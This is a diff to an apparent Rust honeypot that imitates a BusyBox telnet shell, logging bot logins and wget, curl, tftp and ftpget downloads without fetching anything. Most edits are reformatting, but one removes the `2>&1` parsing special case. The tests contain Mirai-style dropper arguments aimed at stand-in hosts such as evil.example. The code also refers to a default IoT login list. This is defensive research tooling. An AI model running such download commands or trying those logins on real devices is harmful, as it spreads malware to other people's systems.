@@ -5,8 +5,8 @@
 //! `wget`, `curl`, `tftp` and `ftpget` without fetching anything. Nothing
 //! runs: the shell only answers, and logs every line.
 use super::{
-    log::{printable, Download, Line, Login, MAX_LINES},
-    services::{now_ms, RunView, Services, SessionId},
+    log::{Download, Line, Login, MAX_LINES, printable},
+    services::{RunView, Services, SessionId, now_ms},
     stand_in,
 };
 use crate::route::config::TelnetLogins;
@@ -22,7 +22,8 @@ const IDLE: Duration = Duration::from_secs(60);
 /// Logins one connection may try before it is hung up.
 const MAX_LOGINS: usize = 10;
 const PROMPT: &str = "~ # ";
-const BANNER: &str = "\r\n\r\nBusyBox v1.31.1 (2020-03-18 10:21:05 CST) built-in shell (ash)\r\n\r\n";
+const BANNER: &str =
+    "\r\n\r\nBusyBox v1.31.1 (2020-03-18 10:21:05 CST) built-in shell (ash)\r\n\r\n";
 
 /// The logins IoT devices ship with, as bot dictionaries list them.
 const DEFAULT_LOGINS: &[(&str, &str)] = &[
@@ -234,9 +235,9 @@ pub(super) fn serve(services: Arc<Services>, stream: UnixStream, endpoint: Strin
                         Some(name) => {
                             let accepted = match shell.view.options.telnet_logins {
                                 TelnetLogins::Any => true,
-                                TelnetLogins::Defaults => DEFAULT_LOGINS
-                                    .iter()
-                                    .any(|(u, p)| *u == name && *p == text),
+                                TelnetLogins::Defaults => {
+                                    DEFAULT_LOGINS.iter().any(|(u, p)| *u == name && *p == text)
+                                }
                             };
                             logins.push(Login {
                                 user: name,
@@ -253,7 +254,9 @@ pub(super) fn serve(services: Arc<Services>, stream: UnixStream, endpoint: Strin
                                 let _ = writer.write_all(b"\r\nLogin incorrect\r\n");
                                 break 'session "too many failed logins";
                             } else {
-                                shell.out.extend_from_slice(b"\r\nLogin incorrect\r\nlogin: ");
+                                shell
+                                    .out
+                                    .extend_from_slice(b"\r\nLogin incorrect\r\nlogin: ");
                             }
                         }
                     }
@@ -337,7 +340,8 @@ impl Shell<'_> {
             .options
             .session_bytes
             .saturating_sub(self.stored + file.bytes.len() as u64) as usize;
-        file.bytes.extend_from_slice(&bytes[..bytes.len().min(room)]);
+        file.bytes
+            .extend_from_slice(&bytes[..bytes.len().min(room)]);
         if served.is_some() {
             file.served = served;
         }
@@ -441,7 +445,11 @@ impl Shell<'_> {
         let mut words = Vec::new();
         let mut flags = true;
         for arg in &args[1..] {
-            if flags && arg.len() > 1 && arg.starts_with('-') && arg[1..].chars().all(|c| "neE".contains(c)) {
+            if flags
+                && arg.len() > 1
+                && arg.starts_with('-')
+                && arg[1..].chars().all(|c| "neE".contains(c))
+            {
                 newline &= !arg.contains('n');
                 escapes |= arg.contains('e');
                 continue;
@@ -450,7 +458,11 @@ impl Shell<'_> {
             words.push(arg.as_str());
         }
         let text = words.join(" ");
-        let mut bytes = if escapes { unescape(&text) } else { text.into_bytes() };
+        let mut bytes = if escapes {
+            unescape(&text)
+        } else {
+            text.into_bytes()
+        };
         if newline {
             bytes.push(b'\n');
         }
@@ -467,7 +479,9 @@ impl Shell<'_> {
             let found: Option<Vec<u8>> = match path.as_str() {
                 "/proc/cpuinfo" => Some(cpuinfo(arch).into_bytes()),
                 "/proc/mounts" => Some(MOUNTS.as_bytes().to_vec()),
-                "/proc/version" => Some(b"Linux version 3.10.14 (root@localhost) #1 SMP PREEMPT\n".to_vec()),
+                "/proc/version" => {
+                    Some(b"Linux version 3.10.14 (root@localhost) #1 SMP PREEMPT\n".to_vec())
+                }
                 // Bots read a system program's ELF header for the architecture.
                 "/bin/echo" | "/bin/busybox" | "/bin/sh" | "/bin/ls" => {
                     stand_in::program(arch).map(|(bytes, _)| bytes)
@@ -476,12 +490,16 @@ impl Shell<'_> {
             };
             match found {
                 Some(bytes) => all.extend_from_slice(&bytes),
-                None => self.say(&format!("cat: can't open '{path}': No such file or directory\n")),
+                None => self.say(&format!(
+                    "cat: can't open '{path}': No such file or directory\n"
+                )),
             }
         }
         match output {
             Some((path, append)) => self.store(&path, all, None, append),
-            None if all.contains(&0) || all.starts_with(b"\x7fELF") => self.out.extend_from_slice(&all),
+            None if all.contains(&0) || all.starts_with(b"\x7fELF") => {
+                self.out.extend_from_slice(&all)
+            }
             None => self.say(&String::from_utf8_lossy(&all)),
         }
     }
@@ -508,7 +526,11 @@ impl Shell<'_> {
             host: asked.host.clone(),
             port: asked.port,
             name: asked.name.clone(),
-            saved_as: if served.is_empty() { String::new() } else { saved_as.clone() },
+            saved_as: if served.is_empty() {
+                String::new()
+            } else {
+                saved_as.clone()
+            },
             served: served.clone(),
         };
         self.services.update(self.id, |s| {
@@ -597,15 +619,27 @@ impl DownloadArgs {
         }
         match tool {
             "wget" | "curl" => {
-                let url = positional.into_iter().find(|p| p.contains('.') || p.contains("://"))?;
-                let full = if url.contains("://") { url } else { format!("http://{url}") };
+                let url = positional
+                    .into_iter()
+                    .find(|p| p.contains('.') || p.contains("://"))?;
+                let full = if url.contains("://") {
+                    url
+                } else {
+                    format!("http://{url}")
+                };
                 let (scheme, rest) = full.split_once("://")?;
                 let (authority, path) = match rest.find('/') {
                     Some(at) => (&rest[..at], &rest[at..]),
                     None => (rest, "/"),
                 };
                 let authority = authority.rsplit('@').next().unwrap_or(authority);
-                let default = if scheme.eq_ignore_ascii_case("https") { 443 } else if scheme.eq_ignore_ascii_case("ftp") { 21 } else { 80 };
+                let default = if scheme.eq_ignore_ascii_case("https") {
+                    443
+                } else if scheme.eq_ignore_ascii_case("ftp") {
+                    21
+                } else {
+                    80
+                };
                 let (host, port) = match authority.rsplit_once(':') {
                     Some((h, p)) => (h, p.parse().unwrap_or(default)),
                     None => (authority, default),
@@ -613,7 +647,8 @@ impl DownloadArgs {
                 out.host = host.into();
                 out.port = port;
                 out.name = path.into();
-                out.stdout |= tool == "curl" && out.local.is_none() && !args.iter().any(|a| a == "-O");
+                out.stdout |=
+                    tool == "curl" && out.local.is_none() && !args.iter().any(|a| a == "-O");
                 out.url = format!("{}://{}{}", scheme.to_ascii_lowercase(), authority, path);
             }
             "tftp" => {
@@ -691,19 +726,33 @@ fn unescape(text: &str) -> Vec<u8> {
         i += 2;
         match next {
             b'x' => {
-                let digits: Vec<u8> = bytes[i..].iter().take(2).take_while(|b| b.is_ascii_hexdigit()).copied().collect();
+                let digits: Vec<u8> = bytes[i..]
+                    .iter()
+                    .take(2)
+                    .take_while(|b| b.is_ascii_hexdigit())
+                    .copied()
+                    .collect();
                 if digits.is_empty() {
                     out.extend_from_slice(b"\\x");
                 } else {
                     i += digits.len();
-                    out.push(u8::from_str_radix(std::str::from_utf8(&digits).unwrap_or("0"), 16).unwrap_or(0));
+                    out.push(
+                        u8::from_str_radix(std::str::from_utf8(&digits).unwrap_or("0"), 16)
+                            .unwrap_or(0),
+                    );
                 }
             }
             b'0'..=b'7' => {
                 let start = if next == b'0' { i } else { i - 1 };
-                let digits: Vec<u8> = bytes[start..].iter().take(3).take_while(|b| (b'0'..=b'7').contains(b)).copied().collect();
+                let digits: Vec<u8> = bytes[start..]
+                    .iter()
+                    .take(3)
+                    .take_while(|b| (b'0'..=b'7').contains(b))
+                    .copied()
+                    .collect();
                 i = start + digits.len();
-                let value = u32::from_str_radix(std::str::from_utf8(&digits).unwrap_or("0"), 8).unwrap_or(0);
+                let value = u32::from_str_radix(std::str::from_utf8(&digits).unwrap_or("0"), 8)
+                    .unwrap_or(0);
                 out.push(value as u8);
             }
             b'n' => out.push(b'\n'),
@@ -741,7 +790,10 @@ fn parse(line: &str) -> Vec<Command> {
     let mut redirect: Option<(bool, bool)> = None; // (append, to a file)
     let chars: Vec<char> = line.chars().collect();
     let mut i = 0;
-    let mut end_word = |word: &mut String, in_word: &mut bool, current: &mut Command, redirect: &mut Option<(bool, bool)>| {
+    let end_word = |word: &mut String,
+                    in_word: &mut bool,
+                    current: &mut Command,
+                    redirect: &mut Option<(bool, bool)>| {
         if !*in_word {
             return;
         }
@@ -785,11 +837,7 @@ fn parse(line: &str) -> Vec<Command> {
             ' ' | '\t' => end_word(&mut word, &mut in_word, &mut current, &mut redirect),
             ';' | '&' | '|' => {
                 end_word(&mut word, &mut in_word, &mut current, &mut redirect);
-                if c == '&' && word.is_empty() && i > 0 && chars[i - 1] == '>' {
-                    // `2>&1`: the descriptor after it is no file.
-                } else {
-                    commands.push(std::mem::take(&mut current));
-                }
+                commands.push(std::mem::take(&mut current));
                 while i + 1 < chars.len() && (chars[i + 1] == c) {
                     i += 1;
                 }
@@ -842,7 +890,10 @@ mod tests {
     fn lines_drop_telnet_commands_and_end_at_cr_or_lf() {
         let mut lines = Lines::new();
         let out = lines.feed(b"\xff\xfb\x01\xff\xfa\x18\x00xterm\xff\xf0root\r\0pass\r\nsh\n");
-        assert_eq!(out, vec![b"root".to_vec(), b"pass".to_vec(), b"sh".to_vec()]);
+        assert_eq!(
+            out,
+            vec![b"root".to_vec(), b"pass".to_vec(), b"sh".to_vec()]
+        );
         assert!(lines.feed(b"par").is_empty());
         assert_eq!(lines.feed(b"tial\n"), vec![b"partial".to_vec()]);
     }
@@ -866,20 +917,33 @@ mod tests {
         );
         assert_eq!(commands[4].output, Some(("/dev/null".into(), false)));
         assert_eq!(commands[5].output, Some((".d".into(), true)));
-        assert_eq!(parse("echo 'a b' c\\ d")[0].args, args(&["echo", "a b", "c d"]));
+        assert_eq!(
+            parse("echo 'a b' c\\ d")[0].args,
+            args(&["echo", "a b", "c d"])
+        );
     }
 
     #[test]
     fn echo_escapes_decode_like_busybox() {
-        assert_eq!(unescape("\\x7f\\x45LF\\n\\0101\\\\"), b"\x7fELF\nA\\".to_vec());
+        assert_eq!(
+            unescape("\\x7f\\x45LF\\n\\0101\\\\"),
+            b"\x7fELF\nA\\".to_vec()
+        );
         assert_eq!(unescape("a\\cb"), b"a".to_vec());
         assert_eq!(unescape("\\xZ"), b"\\xZ".to_vec());
     }
 
     #[test]
     fn download_commands_name_their_url_host_and_file() {
-        let w = DownloadArgs::parse("wget", &args(&["http://1.2.3.4:8080/bins/x.mips", "-O", "y"])).unwrap();
-        assert_eq!((w.host.as_str(), w.port, w.name.as_str(), w.local.as_deref()), ("1.2.3.4", 8080, "/bins/x.mips", Some("y")));
+        let w = DownloadArgs::parse(
+            "wget",
+            &args(&["http://1.2.3.4:8080/bins/x.mips", "-O", "y"]),
+        )
+        .unwrap();
+        assert_eq!(
+            (w.host.as_str(), w.port, w.name.as_str(), w.local.as_deref()),
+            ("1.2.3.4", 8080, "/bins/x.mips", Some("y"))
+        );
         assert_eq!(w.url, "http://1.2.3.4:8080/bins/x.mips");
         let c = DownloadArgs::parse("curl", &args(&["-s", "evil.example/bins.sh"])).unwrap();
         assert!(c.stdout && c.url == "http://evil.example/bins.sh");
@@ -887,8 +951,15 @@ mod tests {
         assert_eq!((t.url.as_str(), t.port), ("tftp://5.6.7.8/t.arm", 69));
         let t2 = DownloadArgs::parse("tftp", &args(&["5.6.7.8", "-c", "get", "t.mpsl"])).unwrap();
         assert_eq!(t2.url, "tftp://5.6.7.8/t.mpsl");
-        let f = DownloadArgs::parse("ftpget", &args(&["-u", "a", "-p", "b", "9.9.9.9", "l", "/pub/f.x86"])).unwrap();
-        assert_eq!((f.url.as_str(), f.local.as_deref()), ("ftp://9.9.9.9/pub/f.x86", Some("l")));
+        let f = DownloadArgs::parse(
+            "ftpget",
+            &args(&["-u", "a", "-p", "b", "9.9.9.9", "l", "/pub/f.x86"]),
+        )
+        .unwrap();
+        assert_eq!(
+            (f.url.as_str(), f.local.as_deref()),
+            ("ftp://9.9.9.9/pub/f.x86", Some("l"))
+        );
         assert!(DownloadArgs::parse("wget", &args(&["-q"])).is_none());
     }
 }
